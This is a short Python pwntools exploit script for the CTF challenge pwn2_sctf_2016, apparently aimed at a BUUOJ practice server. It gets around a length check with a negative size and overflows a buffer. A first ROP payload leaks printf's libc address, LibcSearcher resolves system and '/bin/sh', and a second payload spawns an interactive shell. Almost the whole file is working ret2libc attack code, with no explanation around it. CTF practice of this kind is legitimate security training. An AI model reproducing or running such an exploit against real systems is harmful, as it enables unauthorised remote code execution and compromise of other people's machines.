from pwn import *
from LibcSearcher import *
context.log_level = 'debug'

elf = ELF('./pwn2_sctf_2016')
main = 0x080485b8
int80 = 0x080484d0
mov_ebx_esp = 0x08048400
printf_plt = elf.plt['printf']
printf_got = elf.got['printf']
ret = 0x080485b7

conn = remote('node4.buuoj.cn', 28377)
#conn = process('./pwn2_sctf_2016')
#gdb.attach(conn, 'b *0x0804859d')

conn.recvuntil(b'read? ')
conn.sendline(b'-20')
conn.recvuntil(b'data!\n')

# use sys_call 
payload = b'a' * 0x30
payload += p32(printf_plt) + p32(main) + p32(printf_got)
conn.sendline(payload)
conn.recvuntil(b'\n')
res = conn.recv()
leak_addr = u32(res[:4])
print(f'leak_addr: {hex(leak_addr)}')
libc = LibcSearcher('printf', leak_addr)
libc_base = leak_addr - libc.dump('printf')

system = libc_base + libc.dump('system')
binsh = libc_base + libc.dump('str_bin_sh')


#conn.recvuntil(b'read? ')
conn.sendline(b'-20')
conn.recvuntil(b'data!\n')
payload = b'a' * 0x30 + p32(ret) + p32(system) + b'aaaa' + p32(binsh)
conn.sendline(payload)
conn.recv()
conn.interactive()
